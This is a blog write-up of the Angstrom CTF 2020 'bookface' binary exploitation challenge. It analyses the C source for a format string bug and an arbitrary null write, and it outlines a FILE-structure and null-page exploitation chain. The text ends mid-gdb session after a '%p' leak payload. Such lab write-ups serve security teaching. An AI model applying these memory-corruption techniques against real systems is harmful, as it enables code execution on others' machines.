<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=generator content="Source Themes Academic 4.3.1"><meta name=author content="Bilal Retiat"><meta name=description content="Challenge details    Event Challenge Category     Angstrom CTF 2020 bookface PWN    Description  I made a new social networking service. It&rsquo;s a little glitchy, but no way that could result in a data breach, right?
Connect with nc pwn.2020.chall.actf.co 20733.
 Attachments  bookface.tar.gz
 The attached tarball contains the following files:
   File Description     bookface the main binary   bookface."><link rel=alternate hreflang=en-us href=https://philomath213.github.io/post/angstromctf2020-bookface/><meta name=theme-color content="#2962ff"><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/academicons/1.8.6/css/academicons.min.css integrity="sha256-uFVgMKfistnJAfoCUQigIl+JfUaP47GrRKjf6CTPVmw=" crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.6.0/css/all.css integrity=sha384-aOkxzJ5uQz7WBObEZcHvV5JvRW3TUc2rNPA7pe3AwnsUohiw1Vj2Rgx2KSOkF5+h crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css integrity="sha256-ygkqlh3CYSUri3LhQxzdcm0n1EQvH2Y+U5S2idbLtxs=" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/github.min.css crossorigin=anonymous title=hl-light><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/styles/dracula.min.css crossorigin=anonymous title=hl-dark disabled><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Montserrat:400,700|Roboto:400,400italic,700|Roboto+Mono&display=swap"><link rel=stylesheet href=/css/academic.min.699b1e9ccc182936a0384823ca50fe50.css><script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-136875683-1','auto');ga('require','eventTracker');ga('require','outboundLinkTracker');ga('require','urlChangeTracker');ga('send','pageview');</script><script async src=//www.google-analytics.com/analytics.js></script><script async src=https://cdnjs.cloudflare.com/ajax/libs/autotrack/2.4.1/autotrack.js integrity="sha512-HUmooslVKj4m6OBu0OgzjXXr+QuFYy/k7eLI5jdeEy/F4RSgMn6XRWRGkFi5IFaFgy7uFTkegp3Z0XnJf3Jq+g==" crossorigin=anonymous></script><link rel=manifest href=/site.webmanifest><link rel=icon type=image/png href=/img/icon.png><link rel=apple-touch-icon type=image/png href=/img/icon-192.png><link rel=canonical href=https://philomath213.github.io/post/angstromctf2020-bookface/><meta property="twitter:card" content="summary"><meta property="twitter:site" content="@philomath213"><meta property="twitter:creator" content="@philomath213"><meta property="og:site_name" content="philomath213"><meta property="og:url" content="https://philomath213.github.io/post/angstromctf2020-bookface/"><meta property="og:title" content="Angstrom CTF 2020 - bookface | philomath213"><meta property="og:description" content="Challenge details    Event Challenge Category     Angstrom CTF 2020 bookface PWN    Description  I made a new social networking service. It&rsquo;s a little glitchy, but no way that could result in a data breach, right?
Connect with nc pwn.2020.chall.actf.co 20733.
 Attachments  bookface.tar.gz
 The attached tarball contains the following files:
   File Description     bookface the main binary   bookface."><meta property="og:image" content="https://philomath213.github.io/img/icon-192.png"><meta property="twitter:image" content="https://philomath213.github.io/img/icon-192.png"><meta property="og:locale" content="en-us"><meta property="article:published_time" content="2020-03-26T22:14:39+01:00"><meta property="article:modified_time" content="2020-03-26T22:14:39+01:00"><title>Angstrom CTF 2020 - bookface | philomath213</title></head><body id=top data-spy=scroll data-target=#TableOfContents data-offset=71><aside class=search-results id=search><div class=container><section class=search-header><div class="row no-gutters justify-content-between mb-3"><div class=col-6><h1>Search</h1></div><div class="col-6 col-search-close"><a class=js-search href=#><i class="fas fa-times-circle text-muted" aria-hidden=true></i></a></div></div><div id=search-box><input name=q id=search-query placeholder=Search... autocapitalize=off autocomplete=off autocorrect=off role=textbox spellcheck=false type=search></div></section><section class=section-search-results><div id=search-hits></div></section></div></aside><nav class="navbar navbar-light fixed-top navbar-expand-lg py-0" id=navbar-main><div class=container><a class=navbar-brand href=/><img src=/img/philomath213.png alt=philomath213></a>
<button type=button class=navbar-toggler data-toggle=collapse data-target=#navbar aria-controls=navbar aria-expanded=false aria-label="Toggle navigation">
<span><i class="fas fa-bars"></i></span></button><div class="collapse navbar-collapse" id=navbar><ul class="navbar-nav mr-auto"><li class=nav-item><a class=nav-link href=/#about><span>Home</span></a></li><li class=nav-item><a class=nav-link href=/#posts><span>Posts</span></a></li><li class=nav-item><a class=nav-link href=/#projects><span>Projects</span></a></li><li class=nav-item><a class=nav-link href=/#talks><span>Presentations</span></a></li><li class=nav-item><a class=nav-link href=/#contact><span>Contact</span></a></li><li class=nav-item><a class=nav-link href=/files/cv.pdf><span>CV</span></a></li></ul><ul class="navbar-nav ml-auto"><li class=nav-item><a class="nav-link js-search" href=#><i class="fas fa-search" aria-hidden=true></i></a></li><li class=nav-item><a class="nav-link js-dark-toggle" href=#><i class="fas fa-moon" aria-hidden=true></i></a></li></ul></div></div></nav><article class=article itemscope itemtype=http://schema.org/Article><div class="article-container pt-3"><h1 itemprop=name>Angstrom CTF 2020 - bookface</h1><meta content="2020-03-26 22:14:39 +0100 +0100" itemprop=datePublished><meta content="2020-03-26 22:14:39 +0100 +0100" itemprop=dateModified><div class=article-metadata><span class=article-date><time>Mar 26, 2020</time></span>
<span class=middot-divider></span><a href=/post/angstromctf2020-bookface/#disqus_thread></a><div class=share-box aria-hidden=true><ul class=share><li><a href="https://twitter.com/intent/tweet?url=https://philomath213.github.io/post/angstromctf2020-bookface/&text=Angstrom%20CTF%202020%20-%20bookface" target=_blank rel=noopener class=share-btn-twitter><i class="fab fa-twitter"></i></a></li><li><a href="https://www.facebook.com/sharer.php?u=https://philomath213.github.io/post/angstromctf2020-bookface/&t=Angstrom%20CTF%202020%20-%20bookface" target=_blank rel=noopener class=share-btn-facebook><i class="fab fa-facebook-f"></i></a></li><li><a href="mailto:?subject=Angstrom%20CTF%202020%20-%20bookface&body=https://philomath213.github.io/post/angstromctf2020-bookface/" target=_blank rel=noopener class=share-btn-email><i class="fas fa-envelope"></i></a></li><li><a href="https://www.linkedin.com/shareArticle?url=https://philomath213.github.io/post/angstromctf2020-bookface/&title=Angstrom%20CTF%202020%20-%20bookface" target=_blank rel=noopener class=share-btn-linkedin><i class="fab fa-linkedin-in"></i></a></li><li><a href="https://web.whatsapp.com/send?text=Angstrom%20CTF%202020%20-%20bookface%20https://philomath213.github.io/post/angstromctf2020-bookface/" target=_blank rel=noopener class=share-btn-whatsapp><i class="fab fa-whatsapp"></i></a></li><li><a href="https://service.weibo.com/share/share.php?url=https://philomath213.github.io/post/angstromctf2020-bookface/&title=Angstrom%20CTF%202020%20-%20bookface" target=_blank rel=noopener class=share-btn-weibo><i class="fab fa-weibo"></i></a></li></ul></div></div></div><div class=article-container><div class=article-style itemprop=articleBody><h2 id=challenge-details>Challenge details</h2><table><thead><tr><th style=text-align:center>Event</th><th style=text-align:center>Challenge</th><th style=text-align:center>Category</th></tr></thead><tbody><tr><td style=text-align:center>Angstrom CTF 2020</td><td style=text-align:center>bookface</td><td style=text-align:center>PWN</td></tr></tbody></table><h3 id=description>Description</h3><blockquote><p>I made a new social networking service. It&rsquo;s a little glitchy, but no way that could result in a data breach, right?</p><p>Connect with nc pwn.2020.chall.actf.co 20733.</p></blockquote><h3 id=attachments>Attachments</h3><blockquote><p><a href=https://files.actf.co/045bb892badfedab43024208332e2cd03072cc164e2d9c9d74aac29d0cbffeeb/bookface.tar.gz>bookface.tar.gz</a></p></blockquote><p>The attached tarball contains the following files:</p><table><thead><tr><th style=text-align:left>File</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left>bookface</td><td style=text-align:left>the main binary</td></tr><tr><td style=text-align:left>bookface.c</td><td style=text-align:left>binary source code</td></tr><tr><td style=text-align:left>libc.so.6</td><td style=text-align:left>remote server libc</td></tr><tr><td style=text-align:left>Dockerfile</td><td style=text-align:left>Dockerfile used to build the remote challenge</td></tr><tr><td style=text-align:left>xinetd.conf</td><td style=text-align:left>xinetd config file to run the challenge</td></tr><tr><td style=text-align:left>server.sh</td><td style=text-align:left>the executable to be launched via xinetd which will run bookface</td></tr></tbody></table><h3 id=tldl>TL;DL</h3><ul><li>Leak Libc address using Format String Attack.</li><li>Abusing <em>glibc PRNG</em> by overwrite the random state using <em>friends</em> pointer.</li><li>Writing a forged <em>FILE</em> structure in <em>Zero Page</em>.</li><li>Trigger <em>FILE</em> structure exploit by a <em>NULL Pointer Dereference Attack</em> and exploiting a <em>TOCTOU</em> bug.</li></ul><p>As usually in binary exploitation, binaries are related to <em>libc</em>, most of the time we need the libc to exploit the binary (calling <em>system</em> function, overwriting (malloc) or <em>free</em> hooks, using <em>one_gadget</em>, &mldr;), so it&rsquo;s better to start debugging using the remote libc locally, there are many ways to achieve that.</p><p>We can easily build an identical docker image to the remote challenge image using these files, but if you want to debug the binary inside a container you need to install your favorite tools (gdb with peda, pwndbg or gef extension) inside the container.</p><p>The easy way that I prefer is patching the binary and modifying the <em>RUNPATH</em> to point to the directory where the target libc is located, this technique is explained in <a href=https://www.ayrx.me/about>@Ayrx</a> blog post <strong>&ldquo;Using a non-system glibc&rdquo;</strong><sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ mv bookface backup
$ python change_glibc.py backup libc.so.6 ld-2.23.so bookface 
Current ld.so:
Path: /lib64/ld-linux-x86-64.so.2

New ld.so:
Path: /home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so

Adding RUNPATH:
Path: /home/philomath213/Documents/CTFs/angstromctf2020/bookface

Writing new binary bookface
Please rename /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 to /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6.
</code></pre></div><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ ldd backup       
	linux-vdso.so.1 <span style=color:#f92672>(</span>0x00007ffd10964000<span style=color:#f92672>)</span>
	libc.so.6 <span style=color:#f92672>=</span>&gt; /usr/lib/libc.so.6 <span style=color:#f92672>(</span>0x00007f80eaf0f000<span style=color:#f92672>)</span>
	/lib64/ld-linux-x86-64.so.2 <span style=color:#f92672>=</span>&gt; /usr/lib64/ld-linux-x86-64.so.2 <span style=color:#f92672>(</span>0x00007f80eb123000<span style=color:#f92672>)</span>

$ ldd bookface     
	linux-vdso.so.1 <span style=color:#f92672>(</span>0x00007ffe1bbe7000<span style=color:#f92672>)</span>
	libc.so.6 <span style=color:#f92672>=</span>&gt; /home/philomath213/Documents/CTFs/angstromctf2020/bookface/libc.so.6 <span style=color:#f92672>(</span>0x00007ff062cb8000<span style=color:#f92672>)</span>
	/home/philomath213/Documents/CTFs/angstromctf2020/bookface/ld-2.23.so <span style=color:#f92672>=</span>&gt; /usr/lib64/ld-linux-x86-64.so.2 <span style=color:#f92672>(</span>0x00007ff0630ae000<span style=color:#f92672>)</span>
</code></pre></div><p><strong>N.B.</strong> You can get <em>ld-2.23.so</em> file from the <em>ubuntu:xenial</em> image.</p><p>Now we can run the binary locally with the same libc used remotely.</p><h2 id=source-code-analysis>Source Code Analysis</h2><p>Since the source code is available, we don&rsquo;t have to reverse engineering the binary, just read the code.</p><p>For global variables we have <code>user</code> a profile structure pointer and <code>uid</code> an integer.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>struct</span> profile <span style=color:#f92672>*</span>user;
<span style=color:#66d9ef>int</span> uid;
</code></pre></div><p>The profile structure has two fields: a <em>char array</em> (<code>name</code>) of size <em>0x100</em> and a pointer to a <em>long long</em> (<code>friends</code>).</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>struct</span> profile {
  <span style=color:#66d9ef>char</span> name[<span style=color:#ae81ff>0x100</span>];
  <span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> <span style=color:#f92672>*</span>friends;  <span style=color:#75715e>// some people have a lot of friends
</span><span style=color:#75715e></span>};
</code></pre></div><p>This program first call <code>srand</code> to set <code>time(NULL)</code> as seed for a new sequence of pseudo-random integers to be returned by <code>rand()</code> we will get back to this later in the writeup.</p><p>Then it calls <code>login()</code>, the <code>login</code> function basically asks for userid and creates a file with userid as a file name under <code>users</code> directory.</p><p>If the file doesn&rsquo;t exist, the program will call <code>mmap</code>, this will basically allocates a memory at a random address, witg a size equals to size of <code>profile</code> structure, the protections are <em>PROT_READ | PROT_WRITE</em>. Then it reads <em>0x100</em> bytes into it using <code>fgets</code>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>puts(<span style=color:#e6db74>&#34;Welcome to bookface!&#34;</span>);
user <span style=color:#f92672>=</span> mmap(rand() <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xfffffffffffff000</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> profile),
			PROT_READ <span style=color:#f92672>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#f92672>|</span> MAP_ANONYMOUS <span style=color:#f92672>|</span> MAP_FIXED,
			<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>);
printf(<span style=color:#e6db74>&#34;What&#39;s your name? &#34;</span>);
fgets(user<span style=color:#f92672>-&gt;</span>name, <span style=color:#ae81ff>0x100</span>, stdin);
</code></pre></div><p>If the file already exists then it will ask for a brief survey.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>puts(<span style=color:#e6db74>&#34;Before you log back in, please complete a brief survey.&#34;</span>);
    puts(<span style=color:#e6db74>&#34;For each of the following categories, rate us from 1-10.&#34;</span>);
    <span style=color:#66d9ef>char</span> survey[<span style=color:#ae81ff>20</span>];
    <span style=color:#66d9ef>int</span> n <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    printf(<span style=color:#e6db74>&#34;Content: &#34;</span>);
    n <span style=color:#f92672>+=</span> read(<span style=color:#ae81ff>1</span>, survey <span style=color:#f92672>+</span> n, <span style=color:#ae81ff>3</span>);
    printf(<span style=color:#e6db74>&#34;Moderation: &#34;</span>);
    n <span style=color:#f92672>+=</span> read(<span style=color:#ae81ff>1</span>, survey <span style=color:#f92672>+</span> n, <span style=color:#ae81ff>3</span>);
    printf(<span style=color:#e6db74>&#34;Interface: &#34;</span>);
    n <span style=color:#f92672>+=</span> read(<span style=color:#ae81ff>1</span>, survey <span style=color:#f92672>+</span> n, <span style=color:#ae81ff>3</span>);
    printf(<span style=color:#e6db74>&#34;Support: &#34;</span>);
    n <span style=color:#f92672>+=</span> read(<span style=color:#ae81ff>1</span>, survey <span style=color:#f92672>+</span> n, <span style=color:#ae81ff>3</span>);
    survey[n] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</code></pre></div><p>The program check if there is any <code>'n'</code> letter in the inputs, if so the program will exit.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>if</span> (strchr(survey, <span style=color:#e6db74>&#39;n&#39;</span>) <span style=color:#f92672>!=</span> NULL) {
      <span style=color:#75715e>// a bug bounty report said something about hacking and the letter n
</span><span style=color:#75715e></span>      puts(<span style=color:#e6db74>&#34;ERROR: HACKING DETECTED&#34;</span>);
      puts(<span style=color:#e6db74>&#34;Exiting...&#34;</span>);
      exit(<span style=color:#ae81ff>1</span>);
    }
</code></pre></div><p>This would prevent users from doing arbitrary write using <strong>Format String Attack</strong><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup> (using the common <em>%n</em> specifier), if there is any vulnerability like that.</p><p>If the survey rates are different than <em>10, 10, 10, 10</em>, we notice the format string bug!.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>if</span> (strcmp(survey, <span style=color:#e6db74>&#34;10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
      puts(
          <span style=color:#e6db74>&#34;Those ratings don&#39;t seem quite right. Please review them and try &#34;</span>
          <span style=color:#e6db74>&#34;again:&#34;</span>);
      printf(survey);
      n <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
      printf(<span style=color:#e6db74>&#34;Content: &#34;</span>);
      n <span style=color:#f92672>+=</span> read(<span style=color:#ae81ff>1</span>, survey <span style=color:#f92672>+</span> n, <span style=color:#ae81ff>3</span>);
      printf(<span style=color:#e6db74>&#34;Moderation: &#34;</span>);
      n <span style=color:#f92672>+=</span> read(<span style=color:#ae81ff>1</span>, survey <span style=color:#f92672>+</span> n, <span style=color:#ae81ff>3</span>);
      printf(<span style=color:#e6db74>&#34;Interface: &#34;</span>);
      n <span style=color:#f92672>+=</span> read(<span style=color:#ae81ff>1</span>, survey <span style=color:#f92672>+</span> n, <span style=color:#ae81ff>3</span>);
      printf(<span style=color:#e6db74>&#34;Support: &#34;</span>);
      n <span style=color:#f92672>+=</span> read(<span style=color:#ae81ff>1</span>, survey <span style=color:#f92672>+</span> n, <span style=color:#ae81ff>3</span>);
      survey[n] <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
    }
</code></pre></div><p>The program will call <code>printf</code> with user input <code>survey</code> directly as a format string <code>printf(survey)</code>, so we have Format String Bug here.</p><p>Then it opens the file and reads its content into an allocated memory via <code>mmap</code> the same way as mentioned above.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>user <span style=color:#f92672>=</span> mmap(rand() <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xfffffffffffff000</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> profile),
                PROT_READ <span style=color:#f92672>|</span> PROT_WRITE, MAP_PRIVATE <span style=color:#f92672>|</span> MAP_ANONYMOUS <span style=color:#f92672>|</span> MAP_FIXED,
                <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>0</span>);
FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> fopen(file, <span style=color:#e6db74>&#34;rb&#34;</span>);
fread(user, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> profile), f);
fclose(f);
</code></pre></div><p>At the end it checks if the survey rates were different then <em>10, 10, 10, 10</em>, it will set friends number to <em>0</em>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#66d9ef>if</span> (strcmp(survey, <span style=color:#e6db74>&#34;10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>10</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
puts(
	<span style=color:#e6db74>&#34;Our survey says... you don&#39;t seem very nice. I doubt you have any &#34;</span>
	<span style=color:#e6db74>&#34;friends!&#34;</span>);
<span style=color:#f92672>*</span>(user<span style=color:#f92672>-&gt;</span>friends) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
}
</code></pre></div><p>That&rsquo;s all what login function does, in the other hand the <code>main</code> function is just menu-driven while loop to choose between:</p><p><img src=/post/AngstromCTF2020-bookface/screenshot0.png alt=screenshot0></p><ol><li><em>incrementing friends number</em></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>printf(<span style=color:#e6db74>&#34;How many friends would you like to make? &#34;</span>);
<span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> new;
scanf(<span style=color:#e6db74>&#34; %lld&#34;</span>, <span style=color:#f92672>&amp;</span>new);
user<span style=color:#f92672>-&gt;</span>friends <span style=color:#f92672>+=</span> new;
</code></pre></div><p>This will increments the pointer friends, it an obvious mistake.</p><ol start=2><li><em>decrementing friends number</em></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>printf(<span style=color:#e6db74>&#34;How many friends would you like to lose? &#34;</span>);
<span style=color:#66d9ef>long</span> <span style=color:#66d9ef>long</span> lost;
scanf(<span style=color:#e6db74>&#34; %lld&#34;</span>, <span style=color:#f92672>&amp;</span>lost);
user<span style=color:#f92672>-&gt;</span>friends <span style=color:#f92672>-=</span> lost;
</code></pre></div><p>The same here, decrementing the pointer friends.</p><ol start=3><li><em>deleting account</em></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>puts(<span style=color:#e6db74>&#34;Deleting account...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
sprintf(file, <span style=color:#e6db74>&#34;users/%d&#34;</span>, uid);
remove(file);
login();
</code></pre></div><p>This will remove the file corresponding to userid, the call <code>login</code> function again.</p><ol start=4><li><em>login off</em></li></ol><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>puts(<span style=color:#e6db74>&#34;Logging out...</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
sprintf(file, <span style=color:#e6db74>&#34;users/%d&#34;</span>, uid);
FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> fopen(file, <span style=color:#e6db74>&#34;wb&#34;</span>);
fwrite(user, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> profile), f);
fclose(f);
login();
</code></pre></div><p>This will write the content pointed by <code>user</code> to the file corresponding to userid, and then will call <code>login</code> again.</p><p>Let&rsquo;s get back to <code>login</code> function, at the end if the survey rates were different then <em>10, 10, 10, 10</em> the program do this instruction <code>*(user->friends) = 0</code> which will dereference the <code>friends</code> <code>long long*</code> pointer and set its content to 0 (i.e. write 8 NULL bytes where <code>friends</code> is pointing), it means we have arbitrary 8 NULL bytes write.</p><p><strong>Another remark:</strong> The program lacks errors checking, overall there are no error checking when dealing with files (<code>fopen</code>, <code>fclose</code>, <code>fread</code>).</p><h2 id=detected-vulnerabilities>Detected vulnerabilities</h2><ul><li>Format String vulnerability (&ldquo;arbitrary write&rdquo; isn&rsquo;t included since &lsquo;n&rsquo; letter is filtered) in login function.</li><li>Arbitrary 8 NULL bytes write via friends pointer.</li><li>The lack of errors checking.</li></ul><h2 id=exploitation>Exploitation</h2><p>None of these vulnerabilities on their own allow us to exploit this binary, we need to use multiples attacks to achieve code execution on the remote server.</p><p>Note that the 1st line of Dockerfile contains a comment:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#IMPORTANT: on host system: sysctl vm.mmap_min_addr=0</span>
</code></pre></div><p>What does it mean?</p><p><code>mmap_min_addr</code> is a kernel tunable that specifies the minimum virtual address that a process is allowed to mmap<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>, Allowing processes to map low values expose the system to &ldquo;Kernel NULL pointer dereference&rdquo; attacks<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>.</p><p>It was introduced to Linux Kernel as mitigation against Null Pointer Dereference Attacks, but in our case it&rsquo;s disabled since <em>mmap_min_addr=0</em>.</p><p>You can check the current value in your local machine at <code>/proc/sys/vm/mmap_min_addr</code> (Arch linux, for other distributions maybe at a different location)</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat /proc/sys/vm/mmap_min_addr
<span style=color:#ae81ff>65536</span>
</code></pre></div><p>The default value in Arch Linux is <em>65536</em> (<em>0x10000</em>).</p><p><strong>N.B.</strong> This a Kernel feature like ASLR, and Linux containers share the same kernel with the host machine.</p><p>If you are familiar with Linux Kernel Exploitation you probably know how NULL pointer dereference happens, most of the time is due to the lack of error checking.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>FILE <span style=color:#f92672>*</span>f <span style=color:#f92672>=</span> fopen(file, <span style=color:#e6db74>&#34;rb&#34;</span>);
fread(user, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> profile), f);
fclose(f);
</code></pre></div><p>Upon successful completion <code>fopen</code> returns a <code>FILE</code> pointer Otherwise, <code>NULL</code> is returned.</p><p>NULL is just a zero value, NULL pointer is 8 (or 4 in 32 bits machine) null bytes (i.e. 0x0000000000000000 or 0x00000000 in 32 bits machine).</p><p>What will happen if <code>fopen</code> fails? basically the following:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c>fread(user, <span style=color:#ae81ff>1</span>, <span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> profile), (FILE <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0</span>);
fclose((FILE <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0</span>);
</code></pre></div><p><code>fread</code> and <code>fclose</code> will dereference the <code>f</code> <em>FILE</em> pointer (<code>f</code> will points to <em>0x0000000000000000</em> memory address).</p><p>So if we can map (allocate) memory at the <em>0x0000000000000000</em> address (<em>Zero Page</em>) and write a forged FILE structure there.</p><p><code>fread</code> and <code>fclose</code> will simply consider it as valid FILE structure.</p><p>The question is therefore: How can this helps us achieve code execution?</p><p><a href=https://gsec.hitb.org/sg2018/speakers/an-jie-yang-angelboy/>@Angelboy</a> in his paper <strong>FILE Structures: Another Binary Exploitation Technique</strong><sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>, presented at HITB GSEC 2018 Conference proposed a new attack technique that exploits the <em>FILE</em> structure in GNU C Library (<em>glibc</em>) to gain control over execution flow (<em>RIP</em>), this technique won&rsquo;t only get <em>RIP</em> control, but also control over <em>RDI</em>, <em>RSI</em> and <em>RDX</em>.</p><p>The attack is illustrated in <a href=https://dhavalkapil.com/about/>@Dhaval Kapil</a> blog post <strong>FILE Structure Exploitation (&lsquo;vtable&rsquo; check bypass)</strong><sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>, it calls <code>fclose</code> with a forged FILE structure, this structure contains <code>vtable</code>, which is a pointer to a table contains functions that will be called when the original <code>FILE</code> pointer is used to perform different operations (e.g. <code>fclose</code>, <code>fread</code>, <code>fwrite</code>).</p><p>So what we need right now is:</p><ol><li>Make <code>mmap</code> maps a memory page at address <em>0x0000000000000000</em>.</li><li>Forge a malicious FILE structure at <em>0x0000000000000000</em>.</li><li>Make <code>fopen</code> fails and return NULL in order to call <code>fclose((FILE *)0)</code>.</li></ol><h3 id=libc--pie-leak>LIBC + PIE Leak</h3><p>The binary comes with all protection schemes + ASLR enabled.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ checksec --file bookface
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></div><p>We need to leak some addresses to bypass <code>PIE</code> and <code>ASLR</code>.</p><p>We&rsquo;ll use Format String Attack to get leak to address in the stack, to get to that we need to provide a userid then logout and use the same userid.</p><p>We&rsquo;ll set a breakpoint at <code>*login+501</code> where the program calls <code>printf(survey)</code> and observe what&rsquo;s in the stack at that point.</p><pre><code class=language-none data-lang=none>$ gdb-gef bookface
...
gef&gt; break *login+820
Breakpoint 1 at 0x449e
gef&gt;  run 
Starting program: /home/philomath213/Documents/CTFs/angstromctf2020/bookface/bookface 
Please enter your user ID: 2130
Welcome to bookface!
What's your name? ABCD
You have 0 friends. What would you like to do?
[1] Make friends
[2] Lose friends
[3] Delete account
[4] Log out
&gt; 4
Logging out...

Please enter your user ID: 2130
Before you log back in, please complete a brief survey.
For each of the following categories, rate us from 1-10.
Content: %p%p%p%p%p
Moderation: Interface: Support: Those ratings don't seem quite right. Please review them and try again:
...
gef&gt;  info frame
Stack level 0, frame at 0x7fffffffdef0:
 rip = 0x55555555849e in login; saved rip = 0x555555558985
 called by frame at 0x7fffffffdf60
 Arglist at 0x7fffffffdee0, args: 
